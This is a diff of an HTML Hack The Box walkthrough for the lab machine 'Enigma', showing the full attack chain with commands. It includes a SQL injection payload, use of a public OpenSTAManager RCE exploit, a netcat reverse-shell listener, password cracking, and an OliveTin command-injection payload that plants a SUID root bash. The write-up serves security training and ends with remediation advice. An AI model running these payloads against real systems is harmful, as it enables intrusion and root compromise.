@@ -1,169 +1,38 @@
 <!DOCTYPE html>
 <html lang="en">
   <head>
-    <meta charset="UTF-8">
-    <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <title>Enigma - HTB Full Pwn Report</title>
-    <link rel="stylesheet" href="../style.css">
-    <style>
-      :root {
-        --bg: #0f172a;
-        --panel: #111827;
-        --panel-2: #1f2937;
-        --text: #e5e7eb;
-        --muted: #9ca3af;
-        --accent: #38bdf8;
-        --accent-2: #22c55e;
-        --warn: #f59e0b;
-        --danger: #ef4444;
-        --border: #334155;
-        --code-bg: #020617;
-      }
-      body {
-        margin: 0;
-        font-family: Arial, Helvetica, sans-serif;
-        background: var(--bg);
-        color: var(--text);
-        line-height: 1.6;
-      }
-      header {
-        padding: 52px 24px;
-        text-align: center;
-        background: linear-gradient(135deg, #111827 0%, #0f172a 55%, #082f49 100%);
-        border-bottom: 1px solid var(--border);
-      }
-      header h1 {
-        margin: 0;
-        font-size: 2.7rem;
-        letter-spacing: 1px;
-      }
-      header p {
-        color: var(--muted);
-        margin-top: 10px;
-        font-size: 1.05rem;
-      }
-      main.report {
-        max-width: 1120px;
-        margin: 0 auto;
-        padding: 32px 20px 64px;
-      }
-      h2 {
-        margin-top: 44px;
-        border-left: 5px solid var(--accent);
-        padding-left: 12px;
-        color: #f8fafc;
-      }
-      h3 {
-        margin-top: 30px;
-        color: #bae6fd;
-      }
-      h4 {
-        color: #bbf7d0;
-        margin-bottom: 6px;
-      }
-      p, li { color: var(--text); }
-      a { color: var(--accent); }
-      code {
-        background: rgba(2, 6, 23, 0.85);
-        color: #f8fafc;
-        padding: 2px 5px;
-        border-radius: 4px;
-      }
-      pre {
-        background: var(--code-bg);
-        color: #e2e8f0;
-        padding: 16px;
-        border-radius: 10px;
-        overflow-x: auto;
-        border: 1px solid var(--border);
-      }
-      pre code { background: transparent; padding: 0; }
-      .card {
-        background: var(--panel);
-        border: 1px solid var(--border);
-        border-radius: 14px;
-        padding: 18px;
-        margin: 18px 0;
-      }
-      .callout {
-        background: rgba(56, 189, 248, 0.08);
-        border-left: 4px solid var(--accent);
-        padding: 14px 16px;
-        border-radius: 8px;
-        margin: 18px 0;
-      }
-      .warning {
-        background: rgba(245, 158, 11, 0.08);
-        border-left: 4px solid var(--warn);
-      }
-      .success {
-        background: rgba(34, 197, 94, 0.08);
-        border-left: 4px solid var(--accent-2);
-      }
-      .danger {
-        background: rgba(239, 68, 68, 0.08);
-        border-left: 4px solid var(--danger);
-      }
-      .report-table {
-        width: 100%;
-        border-collapse: collapse;
-        margin: 18px 0;
-        background: var(--panel);
-        border: 1px solid var(--border);
-      }
-      .report-table th, .report-table td {
-        border: 1px solid var(--border);
-        padding: 10px;
-        text-align: left;
-        vertical-align: top;
-      }
-      .report-table th {
-        background: var(--panel-2);
-        color: #f8fafc;
-      }
-      .phase-grid {
-        display: grid;
-        grid-template-columns: repeat(auto-fit, minmax(235px, 1fr));
-        gap: 14px;
-      }
-      .badge {
-        display: inline-block;
-        padding: 4px 8px;
-        border-radius: 999px;
-        background: #0c4a6e;
-        color: #e0f2fe;
-        font-size: 0.85rem;
-        margin: 2px;
-      }
-      .redacted {
-        color: #fca5a5;
-        font-weight: bold;
-      }
-      .toc ol {
-        columns: 2;
-        column-gap: 28px;
-      }
-      footer {
-        margin-top: 42px;
-        color: var(--muted);
-        font-size: 0.95rem;
-      }
-      @media (max-width: 720px) {
-        .toc ol { columns: 1; }
-        header h1 { font-size: 2.1rem; }
-      }
-    </style>
+    <meta charset="UTF-8" />
+    <meta name="viewport" content="width=device-width, initial-scale=1.0" />
+    <title>Enigma - HTB Report</title>
+    <link rel="stylesheet" href="../style.css" />
   </head>
-
   <body>
-    <header>
-      <h1>Enigma</h1>
-      <p>Hack The Box Full Pwn Report | NFS Credential Exposure → Mail Enumeration → OpenSTAManager RCE → Password Reuse → OliveTin Root Command Injection</p>
+    <header class="site-header">
+      <nav class="nav">
+        <a class="brand" href="../index.html">HTB Reports</a>
+        <a class="nav-pill" href="../index.html">All reports</a>
+      </nav>
     </header>
 
-    <main class="report">
+    <section class="hero">
+      <div class="hero-card">
+        <p class="eyebrow">Hack The Box Walkthrough</p>
+        <h1 class="main-title">Enigma</h1>
+        <p class="subtitle">Hack The Box retired machine report</p>
+      </div>
+    </section>
+
+    <div class="layout">
+      <aside>
+        <h2>Contents</h2>
+        <div class="toc"><a href="#machine-information">Machine Information</a><a href="#executive-summary">Executive Summary</a><a href="#report-structure">Report Structure</a><a href="#phase-1-reconnaissance">Phase 1: Reconnaissance</a><a class="toc-sub" href="#initial-nmap-scan">Initial Nmap Scan</a><a class="toc-sub" href="#service-version-scan">Service Version Scan</a><a class="toc-sub" href="#hosts-file-setup">Hosts File Setup</a><a href="#phase-2-web-and-service-enumeration">Phase 2: Web and Service Enumeration</a><a class="toc-sub" href="#main-http-site">Main HTTP Site</a><a class="toc-sub" href="#directory-enumeration">Directory Enumeration</a><a class="toc-sub" href="#virtual-host-enumeration">Virtual Host Enumeration</a><a href="#phase-3-nfs-credential-discovery">Phase 3: NFS Credential Discovery</a><a class="toc-sub" href="#nfs-export-enumeration">NFS Export Enumeration</a><a class="toc-sub" href="#mounting-the-share">Mounting the Share</a><a class="toc-sub" href="#onboarding-pdf-contents">Onboarding PDF Contents</a><a href="#phase-4-roundcube-mail-enumeration">Phase 4: Roundcube Mail Enumeration</a><a class="toc-sub" href="#roundcube-identification">Roundcube Identification</a><a class="toc-sub" href="#kevin-mailbox">Kevin Mailbox</a><a class="toc-sub" href="#sarah-mailbox-and-openstamanager-credentials">Sarah Mailbox and OpenSTAManager Credentials</a><a href="#phase-5-openstamanager-discovery">Phase 5: OpenSTAManager Discovery</a><a class="toc-sub" href="#application-access">Application Access</a><a class="toc-sub" href="#version">Version</a><a class="toc-sub" href="#authenticated-session-setup">Authenticated Session Setup</a><a href="#phase-6-authenticated-sql-injection-validation">Phase 6: Authenticated SQL Injection Validation</a><a class="toc-sub" href="#vulnerable-endpoint">Vulnerable Endpoint</a><a class="toc-sub" href="#time-based-sql-injection-test">Time-Based SQL Injection Test</a><a class="toc-sub" href="#sqlmap-confirmation">sqlmap Confirmation</a><a href="#phase-7-authenticated-rce-and-initial-shell">Phase 7: Authenticated RCE and Initial Shell</a><a class="toc-sub" href="#openstamanager-rce-poc">OpenSTAManager RCE PoC</a><a class="toc-sub" href="#poc-setup">PoC Setup</a><a class="toc-sub" href="#command-execution-test">Command Execution Test</a><a class="toc-sub" href="#reverse-shell">Reverse Shell</a><a href="#phase-8-database-enumeration">Phase 8: Database Enumeration</a><a class="toc-sub" href="#openstamanager-configuration">OpenSTAManager Configuration</a><a class="toc-sub" href="#mysql-login">MySQL Login</a><a class="toc-sub" href="#user-table-discovery">User Table Discovery</a><a href="#phase-9-password-cracking-and-user-access">Phase 9: Password Cracking and User Access</a><a class="toc-sub" href="#hashcat-cracking">Hashcat Cracking</a><a class="toc-sub" href="#pivot-to-haris">Pivot to haris</a><a class="toc-sub" href="#user-flag">User Flag</a><a href="#phase-10-privilege-escalation-enumeration">Phase 10: Privilege Escalation Enumeration</a><a class="toc-sub" href="#sudo-check">Sudo Check</a><a class="toc-sub" href="#user-context">User Context</a><a class="toc-sub" href="#listening-services">Listening Services</a><a class="toc-sub" href="#local-olivetin-service">Local OliveTin Service</a><a class="toc-sub" href="#olivetin-process">OliveTin Process</a><a href="#phase-11-olivetin-command-injection">Phase 11: OliveTin Command Injection</a><a class="toc-sub" href="#configuration-discovery">Configuration Discovery</a><a class="toc-sub" href="#authentication-and-default-permissions">Authentication and Default Permissions</a><a class="toc-sub" href="#vulnerable-backup-action">Vulnerable Backup Action</a><a class="toc-sub" href="#payload">Payload</a><a class="toc-sub" href="#resulting-command-behavior">Resulting Command Behavior</a><a href="#phase-12-root-flag-retrieval">Phase 12: Root Flag Retrieval</a><a class="toc-sub" href="#suid-bash-check">SUID Bash Check</a><a class="toc-sub" href="#root-shell">Root Shell</a><a class="toc-sub" href="#root-flag">Root Flag</a><a href="#flags">Flags</a><a href="#tools-used">Tools Used</a><a href="#lessons-learned">Lessons Learned</a><a href="#remediation-recommendations">Remediation Recommendations</a><a href="#final-attack-path">Final Attack Path</a></div>
+      </aside>
+
+      <main class="report-shell">
+        <div id="overview"></div>
+        
       <section class="card">
-        <h2>Machine Information</h2>
+        <h2 id="machine-information">Machine Information</h2>
         <table class="report-table">
           <tbody>
             <tr><th>Name</th><td>Enigma</td></tr>
@@ -180,7 +49,7 @@
       </section>
 
       <section>
-        <h2>Executive Summary</h2>
+        <h2 id="executive-summary">Executive Summary</h2>
         <p>
           Enigma exposed several externally reachable services, including HTTP, mail services, and NFS.
           Initial enumeration revealed an NFS share containing an onboarding PDF with employee credentials.
@@ -214,7 +83,7 @@
       </section>
 
       <section class="card toc">
-        <h2>Report Structure</h2>
+        <h2 id="report-structure">Report Structure</h2>
         <ol>
           <li>Reconnaissance</li>
           <li>Service Enumeration</li>
@@ -233,8 +102,8 @@
       </section>
 
       <section>
-        <h2>Phase 1: Reconnaissance</h2>
-        <h3>Initial Nmap Scan</h3>
+        <h2 id="phase-1-reconnaissance">Phase 1: Reconnaissance</h2>
+        <h3 id="initial-nmap-scan">Initial Nmap Scan</h3>
         <pre><code>nmap 10.129.25.4 -oA Files/nmap_initial</code></pre>
         <table class="report-table">
           <thead><tr><th>Port</th><th>State</th><th>Service</th><th>Notes</th></tr></thead>
@@ -250,7 +119,7 @@
           </tbody>
         </table>
 
-        <h3>Service Version Scan</h3>
+        <h3 id="service-version-scan">Service Version Scan</h3>
         <pre><code>nmap -sC -sV -p 22,80,110,111,143,993,995,2049 10.129.25.4 -oA Files/nmap_full</code></pre>
         <pre><code>22/tcp   open  ssh       OpenSSH 9.6p1 Ubuntu 3ubuntu13.16
 80/tcp   open  http      nginx 1.24.0 (Ubuntu)
@@ -261,21 +130,21 @@
 995/tcp  open  ssl/pop3  Dovecot pop3d
 2049/tcp open  nfs       3-4</code></pre>
 
-        <h3>Hosts File Setup</h3>
+        <h3 id="hosts-file-setup">Hosts File Setup</h3>
         <pre><code>echo "10.129.25.4 enigma.htb" | sudo tee -a /etc/hosts
 echo "10.129.25.4 mail001.enigma.htb" | sudo tee -a /etc/hosts
 echo "10.129.25.4 support_001.enigma.htb" | sudo tee -a /etc/hosts</code></pre>
       </section>
 
       <section>
-        <h2>Phase 2: Web and Service Enumeration</h2>
-        <h3>Main HTTP Site</h3>
+        <h2 id="phase-2-web-and-service-enumeration">Phase 2: Web and Service Enumeration</h2>
+        <h3 id="main-http-site">Main HTTP Site</h3>
         <pre><code>whatweb http://enigma.htb
 curl -I http://enigma.htb</code></pre>
         <pre><code>http://enigma.htb [200 OK] Email[support@enigma.htb], HTML5,
 HTTPServer[Ubuntu Linux][nginx/1.24.0 (Ubuntu)], Title[Enigma Corp — Managed IT Solutions]</code></pre>
 
-        <h3>Directory Enumeration</h3>
+        <h3 id="directory-enumeration">Directory Enumeration</h3>
         <pre><code>gobuster dir -u http://enigma.htb \
   -w /usr/share/seclists/Discovery/Web-Content/common.txt \
   -o Files/gobuster_dir</code></pre>
@@ -286,7 +155,7 @@ HTTPServer[Ubuntu Linux][nginx/1.24.0 (Ubuntu)], Title[Enigma Corp — Managed I
           </tbody>
         </table>
 
-        <h3>Virtual Host Enumeration</h3>
+        <h3 id="virtual-host-enumeration">Virtual Host Enumeration</h3>
         <pre><code>gobuster vhost -u http://enigma.htb \
   -w /usr/share/seclists/Discovery/DNS/subdomains-top1million-5000.txt \
   --append-domain</code></pre>
@@ -294,19 +163,19 @@ HTTPServer[Ubuntu Linux][nginx/1.24.0 (Ubuntu)], Title[Enigma Corp — Managed I
       </section>
 
       <section>
-        <h2>Phase 3: NFS Credential Discovery</h2>
-        <h3>NFS Export Enumeration</h3>
+        <h2 id="phase-3-nfs-credential-discovery">Phase 3: NFS Credential Discovery</h2>
+        <h3 id="nfs-export-enumeration">NFS Export Enumeration</h3>
         <pre><code>showmount -e enigma.htb</code></pre>
         <pre><code>Export list for enigma.htb:
 /srv/nfs/onboarding *</code></pre>
 
-        <h3>Mounting the Share</h3>
+        <h3 id="mounting-the-share">Mounting the Share</h3>
         <pre><code>mkdir -p nfs
 sudo mount -t nfs enigma.htb:/srv/nfs/onboarding nfs
 ls -la nfs</code></pre>
         <pre><code>New_Employee_Access.pdf</code></pre>
 
-        <h3>Onboarding PDF Contents</h3>
+        <h3 id="onboarding-pdf-contents">Onboarding PDF Contents</h3>
         <p>
           The NFS share contained an onboarding PDF for a new employee. The file exposed credentials for
           <code>Kevin Mitchell</code> and pointed to the internal mail portal.
@@ -326,19 +195,19 @@ ls -la nfs</code></pre>
       </section>
 
       <section>
-        <h2>Phase 4: Roundcube Mail Enumeration</h2>
-        <h3>Roundcube Identification</h3>
+        <h2 id="phase-4-roundcube-mail-enumeration">Phase 4: Roundcube Mail Enumeration</h2>
+        <h3 id="roundcube-identification">Roundcube Identification</h3>
         <pre><code>curl -I http://mail001.enigma.htb
 whatweb http://mail001.enigma.htb</code></pre>
         <pre><code>RoundCube, Cookies[roundcube_sessid], PasswordField[_pass], Title[Roundcube Webmail :: Welcome to Roundcube Webmail]</code></pre>
 
-        <h3>Kevin Mailbox</h3>
+        <h3 id="kevin-mailbox">Kevin Mailbox</h3>
         <p>
           The <code>kevin</code> credentials allowed successful access to Roundcube. The mailbox contained a welcome email
           from Sarah in Accounts but did not immediately provide system access.
         </p>
 
-        <h3>Sarah Mailbox and OpenSTAManager Credentials</h3>
+        <h3 id="sarah-mailbox-and-openstamanager-credentials">Sarah Mailbox and OpenSTAManager Credentials</h3>
         <p>
           Further mail access led to credentials for an OpenSTAManager instance. The email referenced an internal
           support portal and included temporary administrator access.
@@ -353,38 +222,38 @@ Password: Ne3s4rtars78s</code></pre>
       </section>
 
       <section>
-        <h2>Phase 5: OpenSTAManager Discovery</h2>
-        <h3>Application Access</h3>
+        <h2 id="phase-5-openstamanager-discovery">Phase 5: OpenSTAManager Discovery</h2>
+        <h3 id="application-access">Application Access</h3>
         <p>
           After adding <code>support_001.enigma.htb</code> to <code>/etc/hosts</code>, the administrator credentials were used
           to log into OpenSTAManager.
         </p>
         <pre><code>echo "10.129.25.4 support_001.enigma.htb" | sudo tee -a /etc/hosts</code></pre>
 
-        <h3>Version</h3>
+        <h3 id="version">Version</h3>
         <pre><code>OpenSTAManager Version 2.9.8</code></pre>
 
-        <h3>Authenticated Session Setup</h3>
+        <h3 id="authenticated-session-setup">Authenticated Session Setup</h3>
         <pre><code>export COOKIE='PHPSESSID=ev325njtup3fs4db06dnvdssjp'
 export BASE='http://support_001.enigma.htb'</code></pre>
       </section>
 
       <section>
-        <h2>Phase 6: Authenticated SQL Injection Validation</h2>
-        <h3>Vulnerable Endpoint</h3>
+        <h2 id="phase-6-authenticated-sql-injection-validation">Phase 6: Authenticated SQL Injection Validation</h2>
+        <h3 id="vulnerable-endpoint">Vulnerable Endpoint</h3>
         <p>
           OpenSTAManager 2.9.8 was tested for the authenticated global search SQL injection affecting
           <code>/ajax_search.php</code>. The vulnerable parameter was <code>term</code>.
         </p>
         <pre><code>curl -i -s -b "$COOKIE" "$BASE/ajax_search.php?term=test" | head -30</code></pre>
 
-        <h3>Time-Based SQL Injection Test</h3>
+        <h3 id="time-based-sql-injection-test">Time-Based SQL Injection Test</h3>
         <pre><code>time curl -s -b "$COOKIE" -G "$BASE/ajax_search.php" \
   --data-urlencode 'term=" AND 0 OR SLEEP(3) OR "' \
   -o /dev/null</code></pre>
         <pre><code>real    0m54.410s</code></pre>
 
-        <h3>sqlmap Confirmation</h3>
+        <h3 id="sqlmap-confirmation">sqlmap Confirmation</h3>
         <pre><code>sqlmap -u "$BASE/ajax_search.php?term=test" \
   --cookie="$COOKIE" \
   -p term \
@@ -408,27 +277,27 @@ back-end DBMS: MySQL &gt;= 8.0.0 (Percona fork)</code></pre>
       </section>
 
       <section>
-        <h2>Phase 7: Authenticated RCE and Initial Shell</h2>
-        <h3>OpenSTAManager RCE PoC</h3>
+        <h2 id="phase-7-authenticated-rce-and-initial-shell">Phase 7: Authenticated RCE and Initial Shell</h2>
+        <h3 id="openstamanager-rce-poc">OpenSTAManager RCE PoC</h3>
         <p>
           A public proof-of-concept for authenticated OpenSTAManager RCE was used against the authenticated
           administrator account. The vulnerability abused invoice upload handling and command execution through
           crafted <code>.p7m</code> filenames.
         </p>
 
-        <h3>PoC Setup</h3>
+        <h3 id="poc-setup">PoC Setup</h3>
         <pre><code>cd ~/HTB/Machines/Enigma/Exploits
 git clone https://github.com/jonathan-corbin/CVE-2025-69212-Authenticated-RCE-PoC.git
 cd CVE-2025-69212-Authenticated-RCE-PoC</code></pre>
 
-        <h3>Command Execution Test</h3>
+        <h3 id="command-execution-test">Command Execution Test</h3>
         <pre><code>python3 exploit.py \
   -u http://support_001.enigma.htb \
   -l admin \
   -p 'Ne3s4rtars78s' \
   -c 'id'</code></pre>
 
-        <h3>Reverse Shell</h3>
+        <h3 id="reverse-shell">Reverse Shell</h3>
         <pre><code># Attacker machine
 nc -lvnp 4444
 
@@ -446,8 +315,8 @@ www-data@enigma:~/html/openstamanager$</code></pre>
       </section>
 
       <section>
-        <h2>Phase 8: Database Enumeration</h2>
-        <h3>OpenSTAManager Configuration</h3>
+        <h2 id="phase-8-database-enumeration">Phase 8: Database Enumeration</h2>
+        <h3 id="openstamanager-configuration">OpenSTAManager Configuration</h3>
         <p>
           From the <code>www-data</code> shell, the OpenSTAManager web root contained <code>config.inc.php</code>, which
           exposed local MySQL credentials.
@@ -458,10 +327,10 @@ $db_username = 'brollin';
 $db_password = 'Fri3nds@9099';
 $db_name = 'openstamanager';</code></pre>
 
-        <h3>MySQL Login</h3>
+        <h3 id="mysql-login">MySQL Login</h3>
         <pre><code>mysql -u brollin -p'Fri3nds@9099' openstamanager</code></pre>
 
-        <h3>User Table Discovery</h3>
+        <h3 id="user-table-discovery">User Table Discovery</h3>
         <pre><code>SHOW TABLES;
 DESCRIBE zz_users;
 SELECT * FROM zz_users;</code></pre>
@@ -478,8 +347,8 @@ SELECT * FROM zz_users;</code></pre>
       </section>
 
       <section>
-        <h2>Phase 9: Password Cracking and User Access</h2>
-        <h3>Hashcat Cracking</h3>
+        <h2 id="phase-9-password-cracking-and-user-access">Phase 9: Password Cracking and User Access</h2>
+        <h3 id="hashcat-cracking">Hashcat Cracking</h3>
         <p>
           The OpenSTAManager password hashes used bcrypt. Hashcat mode <code>3200</code> was used with the
           RockYou wordlist.
@@ -488,30 +357,30 @@ SELECT * FROM zz_users;</code></pre>
 hashcat -m 3200 hashes.txt --username --show</code></pre>
         <pre><code>haris:$2y$10$WHf1T79sxjsZongUKT2jGeexTkvihBQyCZeoYXmObiNphrsZDr6eC:bestfriends</code></pre>
 
-        <h3>Pivot to haris</h3>
+        <h3 id="pivot-to-haris">Pivot to haris</h3>
         <pre><code>su haris
 Password: bestfriends</code></pre>
         <pre><code>haris@enigma:/var/www/html/openstamanager$ whoami
 haris</code></pre>
 
-        <h3>User Flag</h3>
+        <h3 id="user-flag">User Flag</h3>
         <pre><code>haris@enigma:~$ cat user.txt
 [REDACTED]</code></pre>
       </section>
 
       <section>
-        <h2>Phase 10: Privilege Escalation Enumeration</h2>
-        <h3>Sudo Check</h3>
+        <h2 id="phase-10-privilege-escalation-enumeration">Phase 10: Privilege Escalation Enumeration</h2>
+        <h3 id="sudo-check">Sudo Check</h3>
         <pre><code>sudo -l</code></pre>
         <pre><code>Sorry, user haris may not run sudo on enigma.</code></pre>
 
-        <h3>User Context</h3>
+        <h3 id="user-context">User Context</h3>
         <pre><code>id
 groups</code></pre>
         <pre><code>uid=1000(haris) gid=1000(haris) groups=1000(haris),100(users)
 haris users</code></pre>
 
-        <h3>Listening Services</h3>
+        <h3 id="listening-services">Listening Services</h3>
         <pre><code>ss -tulpn</code></pre>
         <pre><code>tcp LISTEN 127.0.0.1:3306   MySQL
 tcp LISTEN 127.0.0.1:1337   Local-only web service
@@ -519,14 +388,14 @@ tcp LISTEN 0.0.0.0:80       nginx
 tcp LISTEN 0.0.0.0:22       SSH
 tcp LISTEN 0.0.0.0:2049     NFS</code></pre>
 
-        <h3>Local OliveTin Service</h3>
+        <h3 id="local-olivetin-service">Local OliveTin Service</h3>
         <pre><code>curl -i http://127.0.0.1:1337</code></pre>
         <pre><code>HTTP/1.1 200 OK
 Content-Type: text/html; charset=utf-8
 
 &lt;title&gt;OliveTin&lt;/title&gt;</code></pre>
 
-        <h3>OliveTin Process</h3>
+        <h3 id="olivetin-process">OliveTin Process</h3>
         <pre><code>ps auxww | grep -i '[o]livetin'</code></pre>
         <pre><code>root 1463 0.0 0.4 1239888 17560 ? Ssl 00:34 0:00 /usr/local/bin/OliveTin</code></pre>
 
@@ -536,8 +405,8 @@ Content-Type: text/html; charset=utf-8
       </section>
 
       <section>
-        <h2>Phase 11: OliveTin Command Injection</h2>
-        <h3>Configuration Discovery</h3>
+        <h2 id="phase-11-olivetin-command-injection">Phase 11: OliveTin Command Injection</h2>
+        <h3 id="configuration-discovery">Configuration Discovery</h3>
         <pre><code>find / -iname "*olivetin*" 2&gt;/dev/null
 ls -la /etc/OliveTin
 cat /etc/OliveTin/config.yaml</code></pre>
@@ -546,7 +415,7 @@ cat /etc/OliveTin/config.yaml</code></pre>
 /opt/OliveTin
 /usr/local/bin/OliveTin</code></pre>
 
-        <h3>Authentication and Default Permissions</h3>
+        <h3 id="authentication-and-default-permissions">Authentication and Default Permissions</h3>
         <pre><code>authRequireGuestsToLogin: false
 
 defaultPermissions:
@@ -557,7 +426,7 @@ defaultPermissions:
           OliveTin did not require guests to log in and default permissions allowed users to execute actions.
         </p>
 
-        <h3>Vulnerable Backup Action</h3>
+        <h3 id="vulnerable-backup-action">Vulnerable Backup Action</h3>
         <pre><code>- title: Backup Database
   id: backup_database
   icon: "⛁"
@@ -579,12 +448,12 @@ defaultPermissions:
           remainder of the command, arbitrary commands could be run as <code>root</code>.
         </p>
 
-        <h3>Payload</h3>
+        <h3 id="payload">Payload</h3>
         <pre><code>db_user: backup_svc
 db_pass: x'; cp /bin/bash /tmp/rootbash; chmod 4755 /tmp/rootbash; #
 db_name: production</code></pre>
 
-        <h3>Resulting Command Behavior</h3>
+        <h3 id="resulting-command-behavior">Resulting Command Behavior</h3>
         <pre><code>mysqldump -u backup_svc -p'x'; cp /bin/bash /tmp/rootbash; chmod 4755 /tmp/rootbash; #' production &gt; /opt/backups/backup.sql</code></pre>
 
         <div class="callout success">
@@ -593,18 +462,18 @@ db_name: production</code></pre>
       </section>
 
       <section>
-        <h2>Phase 12: Root Flag Retrieval</h2>
-        <h3>SUID Bash Check</h3>
+        <h2 id="phase-12-root-flag-retrieval">Phase 12: Root Flag Retrieval</h2>
+        <h3 id="suid-bash-check">SUID Bash Check</h3>
         <pre><code>ls -la /tmp/rootbash</code></pre>
         <pre><code>-rwsr-xr-x 1 root root ... /tmp/rootbash</code></pre>
 
-        <h3>Root Shell</h3>
+        <h3 id="root-shell">Root Shell</h3>
         <pre><code>/tmp/rootbash -p
 whoami</code></pre>
         <pre><code>rootbash-5.2# whoami
 root</code></pre>
 
-        <h3>Root Flag</h3>
+        <h3 id="root-flag">Root Flag</h3>
         <pre><code>rootbash-5.2# cat /root/root.txt
 [REDACTED]</code></pre>
 
@@ -614,13 +483,13 @@ root</code></pre>
       </section>
 
       <section>
-        <h2>Flags</h2>
+        <h2 id="flags">Flags</h2>
         <pre><code>user.txt: [REDACTED]
 root.txt: [REDACRED]</code></pre>
       </section>
 
       <section>
-        <h2>Tools Used</h2>
+        <h2 id="tools-used">Tools Used</h2>
         <ul>
           <li>Nmap</li>
           <li>curl</li>
@@ -638,7 +507,7 @@ root.txt: [REDACRED]</code></pre>
       </section>
 
       <section>
-        <h2>Lessons Learned</h2>
+        <h2 id="lessons-learned">Lessons Learned</h2>
         <ul>
           <li>
             <strong>Externally exposed NFS shares are high risk:</strong> the initial foothold came from an unauthenticated NFS export containing onboarding credentials.
@@ -665,7 +534,7 @@ root.txt: [REDACRED]</code></pre>
       </section>
 
       <section>
-        <h2>Remediation Recommendations</h2>
+        <h2 id="remediation-recommendations">Remediation Recommendations</h2>
         <ul>
           <li>Restrict NFS exports to trusted hosts and remove sensitive onboarding material from shared drives.</li>
           <li>Rotate all credentials exposed through NFS and email.</li>
@@ -681,7 +550,7 @@ root.txt: [REDACRED]</code></pre>
       </section>
 
       <section>
-        <h2>Final Attack Path</h2>
+        <h2 id="final-attack-path">Final Attack Path</h2>
         <pre><code>1. Nmap discovered SSH, HTTP, mail services, RPC, and NFS.
 2. HTTP enumeration identified enigma.htb and vhost enumeration found mail001.enigma.htb.
 3. NFS exposed /srv/nfs/onboarding to all clients.
@@ -705,6 +574,12 @@ root.txt: [REDACRED]</code></pre>
       <footer>
         <p><a href="../index.html">Back to all reports</a></p>
       </footer>
-    </main>
+    
+        <footer class="report-footer">
+          <a class="back-link" href="../index.html">Back to all reports</a>
+          <p class="footer-note">HTB report • aligned with the Blocky layout</p>
+        </footer>
+      </main>
+    </div>
   </body>
 </html>
